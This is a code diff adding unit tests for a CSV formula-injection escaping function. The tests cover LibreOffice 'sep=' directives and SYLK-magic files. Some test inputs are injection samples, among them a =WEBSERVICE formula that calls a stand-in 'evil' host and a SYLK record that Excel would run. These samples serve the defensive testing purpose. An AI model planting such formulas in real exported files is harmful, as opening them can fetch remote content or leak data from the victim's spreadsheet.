@@ -309,6 +309,28 @@ describe("escapeCsvFormulasInText", () => {
     expect(escapeCsvFormulasInText("name,value\nx,'=1+1'")).toContain(",''=1+1");
   });
 
+  it("honors a QUOTED sep= directive (LibreOffice Calc)", () => {
+    const out = escapeCsvFormulasInText('"sep=:"\nname:value\nx:"=WEBSERVICE(""http://evil"")"');
+    expect(out).toContain(":\"'=WEBSERVICE");
+  });
+
+  it("does NOT escape a trigger char that is itself the declared sep= separator", () => {
+    // Empty fields and the directive must survive intact when sep is a trigger.
+    expect(escapeCsvFormulasInText("sep=+\na++b")).toBe("sep=+\na++b");
+    expect(escapeCsvFormulasInText("sep==\na==b")).toBe("sep==\na==b");
+    // A real formula cell (trigger != separator) is still escaped.
+    expect(escapeCsvFormulasInText("sep=+\na+=x")).toContain("+'=x");
+  });
+
+  it("neutralizes a SYLK-magic file (leading uppercase ID) that Excel would run", () => {
+    const out = escapeCsvFormulasInText("ID;PSheetJS;N;E\nC;X1;K0;EWEBSERVICE(x)");
+    expect(out.startsWith("'ID;")).toBe(true);
+    // BOM is kept before the neutralizer.
+    expect(escapeCsvFormulasInText("﻿ID;X").startsWith("﻿'ID;")).toBe(true);
+    // A normal file NOT starting with ID is untouched.
+    expect(escapeCsvFormulasInText("name,id\n1,2").startsWith("'")).toBe(false);
+  });
+
   it("chains correctly across streamed chunks via the carry", () => {
     // A boundary char at the end of one chunk + a trigger at the start of the
     // next must still be escaped.
